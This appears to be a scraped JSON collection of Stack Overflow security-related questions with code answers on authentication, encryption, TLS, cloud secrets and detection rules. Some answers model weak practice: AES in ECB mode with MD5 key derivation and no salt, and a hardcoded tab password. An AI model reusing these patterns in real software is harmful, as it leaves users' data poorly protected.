        "body": "-- Create a sample claps table\n-- This table assumes that there is a `posts` table and a `users` table\ncreate table if not exists public.claps (\n    post_id uuid references public.posts on delete cascade not null,\n    user_id uuid references public.users on delete cascade not null,\n    created_at timestamp with time zone default timezone('utc' :: text, now()) not null,\n    PRIMARY KEY (post_id, user_id)\n);\n-- Enable RLS for `claps` table\nalter table public.claps enable row level security;\ncreate policy \"Any users can view the claps table\"\non claps for select\nusing ( true );\ncreate policy \"Allow users to insert their own clap\"\non claps for insert\nwith check ( auth.uid() = user_id );",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2023-08-28T01:22:47",
        "author": "dshukertjr"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/76914532/how-can-aws-ses-send-emails-on-my-behalf-after-just-verifying-my-email-though-a",
    "title": "How can AWS SES send emails on my behalf after just verifying my email though a link?",
    "question_id": 76914532,
    "posted_date": "2023-08-16T10:24:37",
    "answers": [
      {
        "answer_id": 78504014,
        "body": "Authentication-Results: mx.google.com;\n    dkim=pass header.i=@amazonses.com header.s=ug7nbtf4gccmlpwj322ax3p6ow6yfsug header.b=SsHXT3Ft;\n    spf=pass (google.com: domain of 0100018f928068ad-9a95a449-3fd8-4bbb-aa45-661c43d39425-000000@amazonses.com designates 54.240.8.80 as permitted sender) smtp.mailfrom=0100018f928068ad-9a95a449-3fd8-4bbb-aa45-661c43d39425-000000@amazonses.com;\n    dmarc=fail (p=NONE sp=QUARANTINE dis=NONE) header.from=gmail.com\n...\nFrom: foo@gmail.com\nTo: bar@gmail.com\nSubject: Test email",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2024-05-19T17:47:48",
        "author": "Bruno Chagas"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/76530796/in-elasticsearch-is-there-any-api-through-which-i-can-create-a-rule-in-kibana",
    "title": "In ElasticSearch is there any API through which I can create a rule in Kibana",
    "question_id": 76530796,
    "posted_date": "2023-06-22T06:09:06",
    "answers": [
      {
        "answer_id": 76533371,
        "body": "POST api/alerting/rule\n{\n  \"params\":{\n      \"aggType\":\"avg\",\n      \"termSize\":6,\n      \"thresholdComparator\":\">\",\n      \"timeWindowSize\":5,\n      \"timeWindowUnit\":\"m\",\n      \"groupBy\":\"top\",\n      \"threshold\":[\n         1000\n      ],\n      \"index\":[\n         \".test-index\"\n      ],\n      \"timeField\":\"@timestamp\",\n      \"aggField\":\"sheet.version\",\n      \"termField\":\"name.keyword\"\n   },\n   \"consumer\":\"alerts\",\n   \"rule_type_id\":\".index-threshold\",\n   \"schedule\":{\n      \"interval\":\"1m\"\n   },\n   \"actions\":[\n      {\n         \"id\":\"dceeb5d0-6b41-11eb-802b-85b0c1bc8ba2\",\n         \"group\":\"threshold met\",\n         \"params\":{\n            \"level\":\"info\",\n            \"message\":\"alert '{{alertName}}' is active for group '{{context.group}}':\\n\\n- Value: {{context.value}}\\n- Conditions Met: {{context.conditions}} over {{params.timeWindowSize}}{{params.timeWindowUnit}}\\n- Timestamp: {{context.date}}\"\n         }\n      }\n   ],\n   \"tags\":[\n      \"cpu\"\n   ],\n   \"notify_when\":\"onActionGroupChange\",\n   \"name\":\"my alert\"\n}",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2023-06-22T11:17:18",
        "author": "Paulo"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/76495274/convert-java-aes-128-ecb-code-to-aes-256-ecb",
    "title": "Convert java aes-128-ecb code to aes-256-ecb",
    "question_id": 76495274,
    "posted_date": "2023-06-17T04:01:25",
    "answers": [
      {
        "answer_id": 76496058,
        "body": "import org.bouncycastle.crypto.digests.MD5Digest;\nimport org.bouncycastle.crypto.generators.OpenSSLPBEParametersGenerator;\nimport org.bouncycastle.crypto.params.KeyParameter;\nimport org.bouncycastle.crypto.params.ParametersWithIV;\n...\nOpenSSLPBEParametersGenerator pbeGenerator = new OpenSSLPBEParametersGenerator(new MD5Digest()); // digest (here MD5, since createCipher() applies MD5)\npbeGenerator.init(ENCRYPTION_KEY.getBytes(StandardCharsets.UTF_8), new byte[0]);\t\t\t\t // passphrase; salt (here empty, since createCipher() applies no salt)\nParametersWithIV parameters = (ParametersWithIV) pbeGenerator.generateDerivedParameters(256, 0); // keySize in bits; ivSize in bits (here 0 since ECB doesn't apply an IV)\nKeyParameter keyParam = (KeyParameter)parameters.getParameters();\n// byte[] iv = parameters.getIV();\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t // iv (here not required, since ECB doesn't apply an IV)\nSecretKeySpec skc = new SecretKeySpec(keyParam.getKey(), \"AES\");\n...",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2023-06-17T07:51:46",
        "author": "Topaco"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/76272292/using-ansible-to-generate-a-random-password-with-very-specific-properties",
    "title": "Using Ansible to generate a random password with very specific properties",
    "question_id": 76272292,
    "posted_date": "2023-05-17T08:47:58",
    "answers": [
      {
        "answer_id": 76286714,
        "body": "PLAY [localhost] **************************************\nFAILED - RETRYING: Create a password (10 retries left).\nFAILED - RETRYING: Create a password (9 retries left).\nFAILED - RETRYING: Create a password (8 retries left).\nFAILED - RETRYING: Create a password (7 retries left).\nFAILED - RETRYING: Create a password (6 retries left).\nFAILED - RETRYING: Create a password (5 retries left).\nFAILED - RETRYING: Create a password (4 retries left).\nFAILED - RETRYING: Create a password (3 retries left).\nFAILED - RETRYING: Create a password (2 retries left).\nFAILED - RETRYING: Create a password (1 retries left).\nTASK [Create a password] ******************************\nfatal: [localhost]: FAILED! => changed=false\n  ansible_facts:\n    random_password: 'J2LLMsf5CKFOvg8x3S8rub:'\n  attempts: 10",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2023-05-19T03:00:00",
        "author": "U880D"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/76166689/how-to-implement-biometric-authentication-in-a-flutter-app-using-the-local-authe",
    "title": "How to implement biometric authentication in a Flutter app using the local authentication package?",
    "question_id": 76166689,
    "posted_date": "2023-05-03T13:46:23",
    "answers": [
      {
        "answer_id": 76168971,
        "body": "import 'package:firebase_auth/firebase_auth.dart';\nclass AuthenticationService {\n  final FirebaseAuth _firebaseAuth = FirebaseAuth.instance;\n  Future<UserCredential> signIn({String email, String password}) async {\n    return await _firebaseAuth.signInWithEmailAndPassword(\n        email: email, password: password);\n  }\n  Future<UserCredential> signUp({String email, String password}) async {\n    return await _firebaseAuth.createUserWithEmailAndPassword(\n        email: email, password: password);\n  }\n  Future<void> signOut() async {\n    return await _firebaseAuth.signOut();\n  }\n  Stream<User> get currentUser {\n    return _firebaseAuth.authStateChanges();\n  }\n}\nclass AuthenticationService {\n  final LocalAuthentication auth = LocalAuthentication();\n  void authchack(context) async {\n    List<BiometricType> availableBiometrics =\n        await auth.getAvailableBiometrics();\n    if (Platform.isIOS) {\n      if (availableBiometrics.contains(BiometricType.face)) {\n        startBioMetricAuth(\n            context, \"Use Face ID\");\n      } else if (availableBiometrics.contains(BiometricType.fingerprint)) {\n        startBioMetricAuth(\n            context, \"Use Touch ID\");\n      }\n    } else {\n      startBioMetricAuth(\n          context, \"Use Fingerprint\");\n    }\n  }\n  void startBioMetricAuth(context, String message) async {\n    try {\n      bool didAuthenticate = await auth.authenticate(localizedReason: message);\n      if (didAuthenticate) {\n        // your login function\n      } else {\n        showSnackBar(context, 'failed to authenticate');\n      }\n    } on PlatformException {\n      if (kDebugMode) {\n        print(\"Error!\");\n      }\n    }\n  }\n}",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2023-05-03T21:26:15",
        "author": "Irvan Thole"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/75999622/error-creating-bean-with-name-appuserservice-defined-in-class-path-resource-u",
    "title": "Error creating bean with name &#39;appUserService&#39; defined in class path resource: Unsatisfied dependency expressed through constructor parameter 0",
    "question_id": 75999622,
    "posted_date": "2023-04-12T16:34:53",
    "answers": [
      {
        "answer_id": 76000294,
        "body": "package com.example.chessge.security.config;\nimport com.example.chessge.appuser.AppUserService;\nimport lombok.AllArgsConstructor;\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.context.annotation.Configuration;\nimport org.springframework.security.authentication.dao.DaoAuthenticationProvider;\nimport org.springframework.security.config.annotation.authentication.builders.AuthenticationManagerBuilder;\nimport org.springframework.security.config.annotation.web.builders.HttpSecurity;\nimport org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;\nimport org.springframework.security.config.annotation.web.configuration.WebSecurityCustomizer;\nimport org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;\nimport org.springframework.security.web.SecurityFilterChain;\n@Configuration\n@AllArgsConstructor\n@EnableWebSecurity\npublic class WebSecurityConfig {\n    private final AppUserService appUserService;\n    private final BCryptPasswordEncoder bCryptPasswordEncoder;\n    @Bean\n    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {\n        //http.authorizeRequests().antMatchers(\"/api/v*/registration/**\").permitAll().anyRequest().authenticated();\n        http.authorizeHttpRequests()\n                .requestMatchers(\"/api/v*/registration/**\").permitAll()\n                .anyRequest().authenticated();\n        return http.build();\n    }\n    @Bean\n    public WebSecurityCustomizer webSecurityCustomizer(AuthenticationManagerBuilder auth) throws Exception {\n        return (web) -> auth.authenticationProvider(daoAuthenticationProvider());\n    }\n    @Bean\n    public DaoAuthenticationProvider daoAuthenticationProvider(){\n        DaoAuthenticationProvider provider =\n                new DaoAuthenticationProvider();\n        provider.setPasswordEncoder(bCryptPasswordEncoder);\n        provider.setUserDetailsService(appUserService);\n        return provider;\n    }\n}",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2023-04-12T18:28:50",
        "author": "O\u0142Je\u017c"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/75758470/can-i-use-keepersecurity-with-secrets-store-csi-driver",
    "title": "Can i use keepersecurity with secrets-store-csi-driver",
    "question_id": 75758470,
    "posted_date": "2023-03-16T11:43:05",
    "answers": [
      {
        "answer_id": 75801555,
        "body": "apiVersion: apiextensions.k8s.io/v1\nkind: CustomResourceDefinition\nmetadata:\n  annotations:\n    controller-gen.kubebuilder.io/version: v0.9.0\n  creationTimestamp: null\n  name: secretproviderclasses.secrets-store.csi.x-k8s.io\nspec:\n  group: secrets-store.csi.x-k8s.io\n  names:\n    kind: SecretProviderClass\n    listKind: SecretProviderClassList\n    plural: secretproviderclasses\n    singular: secretproviderclass\n  scope: Namespaced\n  versions:\n  - name: v1\n    schema:\n      openAPIV3Schema:\n        description: SecretProviderClass is the Schema for the secretproviderclasses\n          API\n        properties:\n          apiVersion:\n            description: 'APIVersion defines the versioned schema of this representation\n              of an object. Servers should convert recognized schemas to the latest\n              internal value, and may reject unrecognized values. More info: https://git.k8s.io/community/contributors/devel/sig-architecture/api-conventions.md#resources'\n            type: string\n          kind:\n            description: 'Kind is a string value representing the REST resource this\n              object represents. Servers may infer this from the endpoint the client\n              submits requests to. Cannot be updated. In CamelCase. More info: https://git.k8s.io/community/contributors/devel/sig-architecture/api-conventions.md#types-kinds'\n            type: string\n          metadata:\n            type: object\n          spec:\n            description: SecretProviderClassSpec defines the desired state of SecretProviderClass\n            properties:\n              parameters:\n                additionalProperties:\n                  type: string\n                description: Configuration for specific provider\n                type: object\n              provider:\n                description: Configuration for provider name\n                type: string\n              secretObjects:\n                items:\n                  description: SecretObject defines the desired state of synced K8s\n                    secret objects\n                  properties:\n                    annotations:\n                      additionalProperties:\n                        type: string\n                      description: annotations of k8s secret object\n                      type: object\n                    data:\n                      items:\n                        description: SecretObjectData defines the desired state of\n                          synced K8s secret object data\n                        properties:\n                          key:\n                            description: data field to populate\n                            type: string\n                          objectName:\n                            description: name of the object to sync\n                            type: string\n                        type: object\n                      type: array\n                    labels:\n                      additionalProperties:\n                        type: string\n                      description: labels of K8s secret object\n                      type: object\n                    secretName:\n                      description: name of the K8s secret object\n                      type: string\n                    type:\n                      description: type of K8s secret object\n                      type: string\n                  type: object\n                type: array\n            type: object\n          status:\n            description: SecretProviderClassStatus defines the observed state of SecretProviderClass\n            properties:\n              byPod:\n                items:\n                  description: ByPodStatus defines the state of SecretProviderClass\n                    as seen by an individual controller\n                  properties:\n                    id:\n                      description: id of the pod that wrote the status\n                      type: string\n                    namespace:\n                      description: namespace of the pod that wrote the status\n                      type: string\n                  type: object\n                type: array\n            type: object\n        type: object\n    served: true\n    storage: true\n  - deprecated: true\n    deprecationWarning: secrets-store.csi.x-k8s.io/v1alpha1 is deprecated. Use secrets-store.csi.x-k8s.io/v1\n      instead.\n    name: v1alpha1\n    schema:\n      openAPIV3Schema:\n        description: SecretProviderClass is the Schema for the secretproviderclasses\n          API\n        properties:\n          apiVersion:\n            description: 'APIVersion defines the versioned schema of this representation\n              of an object. Servers should convert recognized schemas to the latest\n              internal value, and may reject unrecognized values. More info: https://git.k8s.io/community/contributors/devel/sig-architecture/api-conventions.md#resources'\n            type: string\n          kind:\n            description: 'Kind is a string value representing the REST resource this\n              object represents. Servers may infer this from the endpoint the client\n              submits requests to. Cannot be updated. In CamelCase. More info: https://git.k8s.io/community/contributors/devel/sig-architecture/api-conventions.md#types-kinds'\n            type: string\n          metadata:\n            type: object\n          spec:\n            description: SecretProviderClassSpec defines the desired state of SecretProviderClass\n            properties:\n              parameters:\n                additionalProperties:\n                  type: string\n                description: Configuration for specific provider\n                type: object\n              provider:\n                description: Configuration for provider name\n                type: string\n              secretObjects:\n                items:\n                  description: SecretObject defines the desired state of synced K8s\n                    secret objects\n                  properties:\n                    annotations:\n                      additionalProperties:\n                        type: string\n                      description: annotations of k8s secret object\n                      type: object\n                    data:\n                      items:\n                        description: SecretObjectData defines the desired state of\n                          synced K8s secret object data\n                        properties:\n                          key:\n                            description: data field to populate\n                            type: string\n                          objectName:\n                            description: name of the object to sync\n                            type: string\n                        type: object\n                      type: array\n                    labels:\n                      additionalProperties:\n                        type: string\n                      description: labels of K8s secret object\n                      type: object\n                    secretName:\n                      description: name of the K8s secret object\n                      type: string\n                    type:\n                      description: type of K8s secret object\n                      type: string\n                  type: object\n                type: array\n            type: object\n          status:\n            description: SecretProviderClassStatus defines the observed state of SecretProviderClass\n            properties:\n              byPod:\n                items:\n                  description: ByPodStatus defines the state of SecretProviderClass\n                    as seen by an individual controller\n                  properties:\n                    id:\n                      description: id of the pod that wrote the status\n                      type: string\n                    namespace:\n                      description: namespace of the pod that wrote the status\n                      type: string\n                  type: object\n                type: array\n            type: object\n        type: object\n    served: true\n    storage: false",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2023-03-21T08:57:53",
        "author": "glv"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/75545574/how-to-add-alertproductnames-to-an-incident-in-azure-sentinel",
    "title": "how to add alertProductNames to an incident in Azure Sentinel",
    "question_id": 75545574,
    "posted_date": "2023-02-23T08:36:31",
    "answers": [
      {
        "answer_id": 75556072,
        "body": "{\n\"kind\": \"Scheduled\",\n\"properties\": {\n\"displayName\": \"My scheduled rule\",\n\"description\": \"An example for a scheduled rule\",\n\"severity\": \"High\",\n\"enabled\": true,\n\"tactics\": [\n\"Persistence\",\n\"LateralMovement\"\n],\n\"techniques\": [\n\"T1037\",\n\"T1021\"\n],\n\"query\": \"Heartbeat\",\n\"queryFrequency\": \"PT1H\",\n\"queryPeriod\": \"P2DT1H30M\",\n\"triggerOperator\": \"GreaterThan\",\n\"triggerThreshold\": 0,\n\"suppressionDuration\": \"PT1H\",\n\"suppressionEnabled\": false,\n\"eventGroupingSettings\": {\n\"aggregationKind\": \"AlertPerResult\"\n},\n\"customDetails\": {\n\"OperatingSystemName\": \"OSName\",\n\"OperatingSystemType\": \"OSType\"\n}\n}\n}",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2023-02-24T06:33:09",
        "author": "SiddheshDesai"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/74845695/sysmon-configurations",
    "title": "Sysmon Configurations",
    "question_id": 74845695,
    "posted_date": "2022-12-18T20:55:04",
    "answers": [
      {
        "answer_id": 75933250,
        "body": "<event name=\"SYSMONEVENT_FILE_CREATE\" value=\"11\" level=\"Informational\" template=\"File created\" rulename=\"FileCreate\" ruledefault=\"exclude\" version=\"2\">\n  <data name=\"RuleName\" inType=\"win:UnicodeString\" outType=\"xs:string\" />\n  <data name=\"UtcTime\" inType=\"win:UnicodeString\" outType=\"xs:string\" />\n  <data name=\"ProcessGuid\" inType=\"win:GUID\" />\n  <data name=\"ProcessId\" inType=\"win:UInt32\" outType=\"win:PID\" />\n  <data name=\"Image\" inType=\"win:UnicodeString\" outType=\"xs:string\" />\n  <data name=\"TargetFilename\" inType=\"win:UnicodeString\" outType=\"xs:string\" />\n  <data name=\"CreationUtcTime\" inType=\"win:UnicodeString\" outType=\"xs:string\" />\n  <data name=\"User\" inType=\"win:UnicodeString\" outType=\"xs:string\" />\n</event>",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2023-04-04T15:43:40",
        "author": "Jake Peralta"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/74840376/custom-implementation-of-trust-manager-and-hostname-verifier",
    "title": "Custom Implementation of Trust Manager and Hostname Verifier",
    "question_id": 74840376,
    "posted_date": "2022-12-18T04:45:15",
    "answers": [
      {
        "answer_id": 74842035,
        "body": "public String nsdlResponseLine(String data, String signature){\n        String line = null;\n        try {\n            String urlOfNsdl = nsdlKycVerificationUrl;\n            final String version = nsdlKycVerificationVersion;\n            SSLContext  sslcontext = SSLContext.getInstance(\"TLSv1.2\");\n            String  keyStore = System.getProperty(\"javax.net.ssl.keyStore\");\n            String  keyStoreType = System.getProperty(\"javax.net.ssl.keyStoreType\", KeyStore.getDefaultType());\n            String  keyStorePassword = System.getProperty(\"javax.net.ssl.keyStorePassword\",\"\");\n            KeyManager[]    kms = null;\n            if (keyStore != null) {\n                KeyManagerFactory kmf = KeyManagerFactory.getInstance(KeyManagerFactory.getDefaultAlgorithm());\n                KeyStore ks = KeyStore.getInstance(keyStoreType);\n                if (keyStore != null && !keyStore.equals(\"NONE\")) {\n                    FileInputStream fs = new FileInputStream(keyStore);\n                    ks.load(fs, keyStorePassword.toCharArray());\n                    if (fs != null)\n                        fs.close();\n                    char[] password = null;\n                    if (keyStorePassword.length() > 0)\n                        password = keyStorePassword.toCharArray();\n                    kmf.init(ks, password);\n                    kms = kmf.getKeyManagers();\n                }\n                sslcontext.init(kms, null, null);\n            }\n            SSLSocketFactory factory = sslcontext.getSocketFactory();\n            String urlParameters = getUrlParameters(data, signature, version);\n            URL url = new URL(urlOfNsdl);\n            HttpsURLConnection connection = (HttpsURLConnection) url.openConnection();\n            connection.setRequestMethod(\"POST\");\n            connection.setRequestProperty(\"Content-Type\", \"application/x-www-form-urlencoded\");\n            connection.setRequestProperty(\"Content-Length\", \"\" + Integer.toString(urlParameters.getBytes().length));\n            connection.setRequestProperty(\"Content-Language\", \"en-US\");\n            connection.setUseCaches(false);\n            connection.setDoInput(true);\n            connection.setDoOutput(true);\n            connection.setSSLSocketFactory(factory);\n            connection.setHostnameVerifier(HttpsURLConnection.getDefaultHostnameVerifier());\n            OutputStream os = connection.getOutputStream();\n            OutputStreamWriter osw = new OutputStreamWriter(os);\n            osw.write(urlParameters);\n            osw.flush();\n            osw.close();\n            InputStream is = connection.getInputStream();\n            BufferedReader in = new BufferedReader(new InputStreamReader(is));\n            line = in.readLine();\n            is.close();\n            in.close();\n        } catch (Exception e) {\n            log.debug(\"::Exception: {}\",e.getMessage());\n        }\n        log.debug(\"line;{}\",line);\n        return line;\n    }\n    private String getUrlParameters(String data, String signature, String version) throws UnsupportedEncodingException {\n        return \"data=\" + URLEncoder.encode(data, \"UTF-8\") + \"&signature=\" + URLEncoder.encode(signature, \"UTF-8\") + \"&version=\" + URLEncoder.encode(version, \"UTF-8\");\n    }",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2022-12-18T09:13:57",
        "author": "Vedant Dixit"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/74717453/azure-web-app-connection-string-in-configuration-fetch-values-from-keyvault",
    "title": "Azure web app connection string in configuration fetch values from KeyVault",
    "question_id": 74717453,
    "posted_date": "2022-12-07T08:28:50",
    "answers": [
      {
        "answer_id": 74729347,
        "body": " <configSections>\n    <section name=\"configBuilders\" type=\"System.Configuration.ConfigurationBuildersSection, System.Configuration, Version=4.0.0.0, Culture=neutral, PublicKeyToken=*****\" restartOnExternalChanges=\"false\" requirePermission=\"false\" />\n  </configSections>\n  <configBuilders>\n    <builders>\n      <add name=\"AzureKeyVault\" vaultName=\"KeyVaultName\" type=\"Microsoft.Configuration.ConfigurationBuilders.AzureKeyVaultConfigBuilder, Microsoft.Configuration.ConfigurationBuilders.Azure, Version=1.0.0.0, Culture=neutral\"  vaultUri=\"https://YourKeyVaultName.vault.azure.net\" />\n    </builders>\n  </configBuilders>\n  <connectionStrings>\n    <add name=\"MyNewConn\" connectionString=\"Retrieves the value from Azure App Service Connection String\" providerName=\"System.Data.SqlClient\" />\n  </connectionStrings>",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2022-12-08T06:08:20",
        "author": "Harshitha"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/74584552/changes-made-are-not-reversing",
    "title": "Changes made are not reversing",
    "question_id": 74584552,
    "posted_date": "2022-11-26T13:11:41",
    "answers": [
      {
        "answer_id": 74585115,
        "body": "import time\ndef block_websites():\n    if datetime.now() < end_time:\n        print(\"Block sites\")\n        with open(hosts_path, 'r+') as hostfile:\n            hosts_content = hostfile.read()\n            lock.acquire()\n            for site in sites_to_block:\n                if site not in hosts_content:\n                    hostfile.write(redirect + ' ' + site + '\\n')\n    # add this code snipped\n    else:\n        return\n    while datetime.now() < end_time:\n        time.sleep(1.0)\n    print('Unblock sites')\n    with open(hosts_path, 'r+') as hostfile:\n        lines = hostfile.readlines()\n        hostfile.seek(0)\n        for line in lines:\n            if not any(site in line for site in sites_to_block):\n                hostfile.write(line)\n        hostfile.truncate()",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2022-11-26T14:42:48",
        "author": "NameVergessen"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/74512833/is-it-possible-to-secure-tabs-in-my-pysimplegui-code",
    "title": "Is it possible to secure Tabs in my PySimpleGUI code?",
    "question_id": 74512833,
    "posted_date": "2022-11-20T18:29:59",
    "answers": [
      {
        "answer_id": 74514383,
        "body": "import PySimpleGUI as sg\naccessible = [0, 3]\nlayout = [[sg.TabGroup([[sg.Tab(f'TAB {i}',[[sg.Text(f'This is the Tab {i}')]],key=f'Tab {i}',) for i in range(5)]], key='TabGroup')]]\nwindow = sg.Window('Tab Group', layout, finalize=True)\nwindow['TabGroup'].bind('<Button-1>', ' Change', propagate=False)\nwhile True:\n    event, values = window.read()\n    if event == sg.WIN_CLOSED:\n        break\n    elif event == 'TabGroup Change':\n        e = window['TabGroup'].user_bind_event\n        if e.widget.identify(e.x, e.y) == 'label':\n            index = e.widget.index(f'@{e.x},{e.y}')\n            if index in accessible:\n                window[f'Tab {index}'].select()\n            \"\"\" Password secured\n            else:\n                if sg.popup_get_text(\"Password\") == 'Hello':\n                    window[f'Tab {index}'].select()\n            \"\"\"\nwindow.close()",
        "score": 0,
        "is_accepted": true,
        "creation_date": "2022-11-20T23:52:42",
        "author": "Jason Yang"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/74399823/how-to-generate-a-unique-specific-id-in-python-thats-derived-from-the-hardware",
    "title": "How to generate a unique specific ID in python that&#39;s derived from the hardware info on any system (Mac, Linux or Windows)?",
    "question_id": 74399823,
    "posted_date": "2022-11-11T03:29:39",
    "answers": [
      {
        "answer_id": 74399946,
        "body": "from pprint import pprint\nprint('===================')\nimport psutil\npprint(f'{psutil.net_if_addrs().keys()=}')\nprint('===================')\nimport socket\npprint(f'{socket.if_nameindex()=}' )\nprint('===================')\nimport netifaces           # https://pypi.org/project/netifaces/\npprint(f'{netifaces.ifaddresses(netifaces.interfaces()[-1])=}')\nprint('===================')\nfrom get_nic import getnic # https://pypi.org/project/get-nic/\npprint(f'{getnic.ipaddr(getnic.interfaces())=}')\nprint('===================')",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2022-11-11T03:42:10",
        "author": "user7711283"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/74224035/laravel-external-api-password-handling",
    "title": "Laravel external API password handling",
    "question_id": 74224035,
    "posted_date": "2022-10-27T10:48:49",
    "answers": [
      {
        "answer_id": 74226595,
        "body": "// PiwigoClass\npublic function login() {\n        $response = Http::asForm()\n            ->post(config('piwigo.url') . '?format=json', [\n                'method' => 'pwg.session.login',\n                'username' => config('piwigo.username'),\n                'password' => config('piwigo.password')\n        ]);\n        return $response;\n    }\n// config file piwigo.php\n<?php\nreturn [\n'password' => env('PIWIGO_PASSWORD', 'PassWord'),\n'username' => env('PIWIGO_USERNAME', 'UserName'),\n'url' => env('PIWIGO_URL', 'https://my_api_url...')\n]\n?>",
        "score": 0,
        "is_accepted": true,
        "creation_date": "2022-10-27T14:16:24",
        "author": "Logan C"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/74091651/best-practices-for-http-400-response-security",
    "title": "Best practices for HTTP 400 response security",
    "question_id": 74091651,
    "posted_date": "2022-10-16T20:51:33",
    "answers": [
      {
        "answer_id": 74092103,
        "body": "const AuthError = 1\nconst ValidationError = 2\nconst isId = value =>\n  isString(value)\n    && value.length === StandardIdCharLength\n    && /^[\\w-]*$/.test(value)\nasync function resetPasswordPost(request, response) {\n  try {\n    const body = await jsonBody(request) // throws ValidationError\n    if (!(\n      body\n      && Object.keys(body).length === 3\n      && isPassword(body.password)\n      && isId(body.userId)\n      && isId(body.token)\n    ))\n      throw ValidationError\n    if (!await passwordResetTokenExists(body.token, body.userId))\n      throw AuthError\n    // \u2026\n    sendOk(response)\n  }\n  catch (error) {\n    switch (error) {\n      case AuthError:\n        sendUnauthorized(response)\n        break\n      case ValidationError:\n        sendBadRequest(response)\n        break\n      default:\n        sendInternalServerError(response)\n    }\n  }\n}\nfunction sendBadRequest(response) {\n\tresponse.statusCode = 400\n\tresponse.end()\n}",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2022-10-16T22:39:32",
        "author": "Eric Fortis"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/74075753/how-to-change-the-role-of-a-user-in-customuserdetails",
    "title": "How to change the role of a user in CustomUserDetails?",
    "question_id": 74075753,
    "posted_date": "2022-10-14T19:53:33",
    "answers": [
      {
        "answer_id": 74079429,
        "body": "@Service(\"userDetailsService\")\npublic class CustomUserDetailsService implements UserDetailsService {\n    @Autowired\n    private AccountRepository accountRepository;\n    @Override\n    public UserDetails loadUserByUsername(String login) throws UsernameNotFoundException {\n        Account account = accountRepository.findByLogin(login);\n        if (account == null) {\n            throw new UsernameNotFoundException(login);\n        }\n        return new CustomUserDetails(account, mapRolesToAuthority(account.getRole()));\n    }\n    private Collection<? extends GrantedAuthority> mapRolesToAuthority(Role role) {\n        List<GrantedAuthority> authorities = new ArrayList<>();\n        authorities.add(new SimpleGrantedAuthority(\"ROLE_\" + role.getAuthority()));\n        authorities.add(new SimpleGrantedAuthority(role.getAuthority()));\n        return authorities;\n    }\n}",
        "score": 0,
        "is_accepted": true,
        "creation_date": "2022-10-15T08:26:11",
        "author": "Mark"
      },
      {
        "answer_id": 74079429,
        "body": "@ToString\npublic class CustomUserDetails implements UserDetails {\n    @ToString.Exclude\n    private Account account;\n    private Collection<? extends GrantedAuthority> authorities;\n    private final long serialVersionUID = 1L;\n    public CustomUserDetails(Account account, Collection<? extends GrantedAuthority> authorities) {\n        this.account = account;\n        this.authorities = authorities;\n    }\n    @Override\n    public Collection<? extends GrantedAuthority> getAuthorities() {\n        return authorities;\n    }\n    public void setAuthorities(Collection<? extends GrantedAuthority> authorities) {\n        this.authorities = authorities;\n    }\n    @Override\n    public String getPassword() {\n        return this.account.getPassword();\n    }\n    @Override\n    public String getUsername() {\n        return this.account.getLogin();\n    }\n    public void setUsername(String username) {\n        this.account.setLogin(username);\n    }\n    @Override\n    public boolean isAccountNonExpired() {\n        return true;\n    }\n    @Override\n    public boolean isAccountNonLocked() {\n        return true;\n    }\n    @Override\n    public boolean isCredentialsNonExpired() {\n        return true;\n    }\n    @Override\n    public boolean isEnabled() {\n        return true;\n    }\n}",
        "score": 0,
        "is_accepted": true,
        "creation_date": "2022-10-15T08:26:11",
        "author": "Mark"
      },
      {
        "answer_id": 74079429,
        "body": "@PostMapping(\"/trade\")\n    public String updateAccountRole(Principal principal) {\n        Account account = accountRepository.findByLogin(principal.getName());\n        account.setRole(Role.SELLER);\n        Authentication authentication = SecurityContextHolder.getContext().getAuthentication();\n        CustomUserDetails userDetails = (CustomUserDetails) authentication.getPrincipal();\n        List<GrantedAuthority> authorities = new ArrayList<>();\n        authorities.add(new SimpleGrantedAuthority(\"ROLE_\" + account.getRole().getAuthority()));\n        authorities.add(new SimpleGrantedAuthority(account.getRole().getAuthority()));\n        userDetails.setAuthorities(authorities);\n        System.out.println(\"BEFORE -> \" + SecurityContextHolder.getContext().getAuthentication());\n        UsernamePasswordAuthenticationToken token = new UsernamePasswordAuthenticationToken(\n                SecurityContextHolder.getContext().getAuthentication().getPrincipal(),\n                SecurityContextHolder.getContext().getAuthentication().getCredentials(),\n                userDetails.getAuthorities()\n        );\n        token.setDetails(SecurityContextHolder.getContext().getAuthentication().getDetails());\n        SecurityContextHolder.getContext().setAuthentication(token);\n        System.out.println(\"AFTER -> \" + SecurityContextHolder.getContext().getAuthentication());\n        accountRepository.save(account);\n        return \"redirect:/\";\n    }",
        "score": 0,
        "is_accepted": true,
        "creation_date": "2022-10-15T08:26:11",
